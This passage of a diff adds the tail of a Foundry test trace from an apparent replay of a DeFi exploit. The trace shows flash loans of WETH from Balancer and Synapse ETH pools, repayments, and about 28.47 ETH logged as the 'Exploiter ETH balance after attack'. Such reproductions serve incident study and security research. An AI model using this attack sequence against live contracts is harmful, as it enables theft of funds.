+    │   │   │   │   │   │   │   @ 26: 0x0000000000000000000000000000000000000000000000118ae0e8ec55ba7488 → 0x0000000000000000000000000000000000000000000000118d1fbe0819de0123
+    │   │   │   │   │   │   │   @ 30: 0x0000000000000000000000000000000000000000000000000de9be55d4342da7 → 0x0000000000000000000000000000000000000000000000000dea6d5561ddedd3
+    │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000000067ab97720206918d7e → 0x0000000000000000000000000000000000000000000000690e61f96f95633fa3
+    │   │   │   │   │   │   │   @ 31: 0 → 1
+    │   │   │   │   │   │   │   @ 27: 0x000000000000000000000000000000000000000000011101cb0191fba329d7ba → 0x0000000000000000000000000000000000000000000112e0e6c0c69d6b37aeb8
+    │   │   │   │   │   │   │   @ 3: 0x00000000000000000000000000000000000000000000006e995b26b70caec36d → 0x00000000000000000000000000000000000000000000006e998c1725d0aa0fb0
+    │   │   │   │   │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000000000000065677e0b → 0x0000000000000000000000000000000000000000000000000000000065688525
+    │   │   │   │   │   │   │   @ 28: 0x0000000000000000000000000000000000000000000000000debee1ece1d2f28 → 0x0000000000000000000000000000000000000000000000000decd0542c1c07c0
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [3001] WETH::transfer(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 824240035672384091573 [8.242e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 824240035672384091573 [8.242e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000074547dc9e5ee4db37f → 0x000000000000000000000000000000000000000000000047a5dcf0770a8d7dca
+    │   │   │   │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0 → 0x00000000000000000000000000000000000000000000002caea0d96ee3c035b5
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [457] WETH::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 824240035672384091573 [8.242e20]
+    │   │   │   │   ├─ emit FlashLoan(recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], token: WETH: [0x4200000000000000000000000000000000000006], amount: 824240035672384091573 [8.242e20], feeAmount: 0)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3001] WETH::transfer(SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], 1293199071704484549636 [1.293e21])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], value: 1293199071704484549636 [1.293e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000047a5dcf0770a8d7dca → 0x0000000000000000000000000000000000000000000000018b1ee8697fd769c6
+    │   │   │   │   │   @ 0x12e07608ed4c056b230f2aa83f8aadc4588ddc3981f0205b25ddba2d1ad79e34: 0 → 0x0000000000000000000000000000000000000000000000461abe080d8ab61404
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [457] WETH::balanceOf(SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f]) [staticcall]
+    │   │   │   └─ ← [Return] 1293199071704484549636 [1.293e21]
+    │   │   ├─ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1, param2: 1292165339432938199077 [1.292e21], param3: 1033732271546350559 [1.033e18], param4: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf2192e1030363415d7b4fb0406540a0060e8e2fc8982f3f32289379e11fa6547: 0x000000000000000000000000000000000000000000000044650f005f7ea39271 → 0x00000000000000000000000000000000000000000000004473678e65a5044e50
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [457] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 28471449434096888262 [2.847e19]
+    ├─ [9336] WETH::withdraw(28471449434096888262 [2.847e19])
+    │   ├─ [272] ContractTest::receive{value: 28471449434096888262}()
+    │   │   └─ ← [Stop]
+    │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 28471449434096888262 [2.847e19])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000018b1ee8697fd769c6 → 0
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Exploiter ETH balance after attack", val: 28471449434096888262 [2.847e19], decimals: 18)
+    ├─  storage changes:
+    │   @ 31: 1 → 257
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 43.98s (42.39s CPU time)
+
+Ran 1 test suite in 54.30s (43.98s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
